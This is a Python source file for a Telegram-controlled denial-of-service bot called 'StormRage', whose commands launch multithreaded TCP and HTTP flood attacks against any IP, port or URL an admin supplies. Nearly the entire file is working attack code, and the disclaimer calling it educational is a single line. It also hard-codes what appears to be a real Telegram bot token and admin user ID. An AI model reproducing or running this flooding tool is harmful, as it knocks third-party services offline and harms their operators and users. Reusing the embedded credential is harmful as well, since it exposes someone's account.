import socket
import threading
import requests
import random
import time
import os
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ==================== CONFIGURATION ====================
# CHANGE THESE TWO LINES
BOT_TOKEN = "8957381735:AAEbDCbmmzvT1aDUBdUOjDAHZdbi5OQpxxQ"  # ← Put your bot token
ADMIN_IDS = [7898928200]  # ← Put your Telegram user ID

# Active attacks storage
active_attacks = {}

# ==================== ORIGINAL DDOS FUNCTIONS ====================
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def tcp_flood(ip, port, chat_id):
    while active_attacks.get(chat_id, False):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            data = random._urandom(1024)
            sock.send(data)
            sock.close()
            print(f"\033[92m[TCP] Packet sent to {ip}:{port}")
        except:
            print(f"\033[91m[TCP] Failed to send packet to {ip}:{port}")

def https_flood(url, chat_id):
    while active_attacks.get(chat_id, False):
        try:
            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0',
                    'Chrome/91.0',
                    'Safari/537.36',
                    'Opera/9.80'
                ])
            }
            response = requests.get(url, headers=headers, timeout=3)
            print(f"\033[92m[HTTPS] Request sent to {url} | Status: {response.status_code}")
        except:
            print(f"\033[91m[HTTPS] Failed to send request to {url}")

# ==================== TELEGRAM COMMANDS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized. You are not admin.")
        return
    
    await update.message.reply_text(
        "🔥 *StormRage DDoS Bot Activated* 🔥\n\n"
        "Commands:\n"
        "/attack_tcp <IP> <PORT> <THREADS> - Start TCP attack\n"
        "/attack_http <URL> <THREADS> - Start HTTP attack\n"
        "/stop - Stop current attack\n"
        "/status - Check attack status\n"
        "/help - Show this menu\n\n"
        "⚠️ For educational/testing purposes only!",
        parse_mode='Markdown'
    )

async def attack_tcp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    try:
        ip = context.args[0]
        port = int(context.args[1])
        threads = int(context.args[2])
    except:
        await update.message.reply_text("⚠️ Usage: /attack_tcp <IP> <PORT> <THREADS>\nExample: /attack_tcp 192.168.1.1 80 500")
        return
    
    chat_id = update.effective_chat.id
    
    # Stop any existing attack
    if chat_id in active_attacks:
        active_attacks[chat_id] = False
        time.sleep(1)
    
    active_attacks[chat_id] = True
    
    await update.message.reply_text(
        f"🔥 *TCP Attack Started!*\n"
        f"Target: {ip}:{port}\n"
        f"Threads: {threads}\n"
        f"Status: Sending packets...",
        parse_mode='Markdown'
    )
    
    for _ in range(threads):
        thread = threading.Thread(target=tcp_flood, args=(ip, port, chat_id))
        thread.daemon = True
        thread.start()
    
    # Background stats
    while active_attacks.get(chat_id, False):
        await asyncio.sleep(10)

async def attack_http(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    try:
        url = context.args[0]
        threads = int(context.args[1])
    except:
        await update.message.reply_text("⚠️ Usage: /attack_http <URL> <THREADS>\nExample: /attack_http https://example.com 500")
        return
    
    chat_id = update.effective_chat.id
    
    # Stop any existing attack
    if chat_id in active_attacks:
        active_attacks[chat_id] = False
        time.sleep(1)
    
    active_attacks[chat_id] = True
    
    await update.message.reply_text(
        f"🔥 *HTTP Attack Started!*\n"
        f"Target: {url}\n"
        f"Threads: {threads}\n"
        f"Status: Sending requests...",
        parse_mode='Markdown'
    )
    
    for _ in range(threads):
        thread = threading.Thread(target=https_flood, args=(url, chat_id))
        thread.daemon = True
        thread.start()
    
    while active_attacks.get(chat_id, False):
        await asyncio.sleep(10)

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    chat_id = update.effective_chat.id
    if chat_id in active_attacks and active_attacks[chat_id]:
        active_attacks[chat_id] = False
        await update.message.reply_text("🛑 Attack stopped successfully!")
    else:
        await update.message.reply_text("⚠️ No active attack to stop.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    chat_id = update.effective_chat.id
    if chat_id in active_attacks and active_attacks[chat_id]:
        await update.message.reply_text("💀 Attack is currently RUNNING")
    else:
        await update.message.reply_text("✅ No active attack")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

# ==================== MAIN FIXED ====================
def main():
    print("🤖 Starting StormRage Bot...")
    print("⚠️ Make sure BOT_TOKEN and ADMIN_IDS are set correctly")
    
    # Create bot application
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Add command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack_tcp", attack_tcp))
    app.add_handler(CommandHandler("attack_http", attack_http))
    app.add_handler(CommandHandler("stop", stop_attack))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("help", help_command))
    
    print("✅ Bot handlers registered")
    print("🚀 Bot is running...")
    
    # Start the bot (removed the problematic username line)
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()